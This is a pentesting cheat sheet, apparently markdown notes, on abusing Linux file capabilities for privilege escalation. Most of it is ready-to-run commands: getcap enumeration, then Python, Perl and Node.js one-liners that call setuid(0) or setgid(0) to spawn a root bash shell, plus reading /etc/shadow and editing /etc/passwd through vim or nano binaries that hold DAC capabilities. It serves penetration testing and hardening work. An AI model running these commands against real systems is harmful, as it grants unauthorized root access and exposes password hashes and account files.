# Linux Capabilities Abuse

Linux capabilities provide a more fine-grained access control system than the traditional Linux permissions model. They allow specific privileges to be granted to processes without giving them full root access.

## Finding Files with Capabilities

```bash
# List all files with capabilities set on the system
getcap -r / 2>/dev/null
```

## Common Dangerous Capabilities

### CAP_SETUID

The `CAP_SETUID` capability allows a process to set user IDs, including setting the effective user ID to root.

Example of exploitation with Python:

```bash
# If Python has cap_setuid capability
getcap -r / 2>/dev/null | grep python
# Example output: /usr/bin/python3.7 = cap_setuid+ep

# Exploit to get a root shell
/usr/bin/python3.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### CAP_SETGID

Similar to CAP_SETUID, but for group IDs. 

Example:

```bash
# If a binary has cap_setgid capability
getcap -r / 2>/dev/null | grep setgid
# Example output: /usr/bin/perl = cap_setgid+ep

# Exploit to get a shell with root group privileges
/usr/bin/perl -e 'use POSIX (setgid); setgid(0); exec "/bin/bash";'
```

### CAP_DAC_READ_SEARCH

This capability allows bypassing file read permission checks and directory read/execute permission checks.

Example:

```bash
# If a binary has cap_dac_read_search
getcap -r / 2>/dev/null | grep dac_read_search
# Example output: /usr/bin/vim = cap_dac_read_search+ep

# Use to read sensitive files
/usr/bin/vim /etc/shadow
```

### CAP_DAC_OVERRIDE

This capability bypasses file read, write, and execute permission checks.

Example:

```bash
# If a binary has cap_dac_override
getcap -r / 2>/dev/null | grep dac_override
# Example output: /usr/bin/nano = cap_dac_override+ep

# Use to write to protected files
/usr/bin/nano /etc/passwd
```

## Exploitable Binaries with Capabilities

### Python with cap_setuid

If Python has the `cap_setuid` capability, you can exploit it to get a root shell:

```bash
# Check if Python has the capability
getcap -r /usr/bin/python* 2>/dev/null

# If it does, use this to get a root shell
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### Perl with Capabilities

Perl with certain capabilities can also be exploited:

```bash
# Check if Perl has capabilities
getcap -r /usr/bin/perl* 2>/dev/null

# For cap_setuid+ep
/usr/bin/perl -e 'use POSIX (setuid); setuid(0); exec "/bin/bash";'
```

### Node.js with Capabilities

Node.js can be exploited if it has capabilities:

```bash
# Check for Node.js with capabilities
getcap -r /usr/bin/node* 2>/dev/null

# For cap_setuid+ep
/usr/bin/node -e 'process.setuid(0); require("child_process").spawn("/bin/bash", {stdio: [0, 1, 2]});'
```

### Other Languages and Binaries

Similar techniques can be used with other interpreted languages if they have capabilities set:
- Ruby
- PHP
- Lua

## Setting Capabilities (for Educational Purposes)

If you want to understand how capabilities are set:

```bash
# Setting a capability (requires root)
sudo setcap cap_setuid+ep /path/to/binary
```

## Viewing Information About Capabilities

```bash
# View capabilities of current process
capsh --print

# List all capabilities
capsh --print | grep cap_
```

## Capabilities During Penetration Testing

When performing penetration testing on a Linux system:

1. Always check for files with capabilities set
2. Focus on binaries with dangerous capabilities like setuid, setgid, and dac_override
3. Check interpreted language binaries especially (Python, Perl, Ruby, etc.)
4. Look for unusual or custom binaries with capabilities

## Additional Resources

- [HackTricks - Linux Capabilities](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities)
- [Linux Capabilities Explained](https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/)
- [GTFOBins](https://gtfobins.github.io/) - Check for capabilities section for each binary 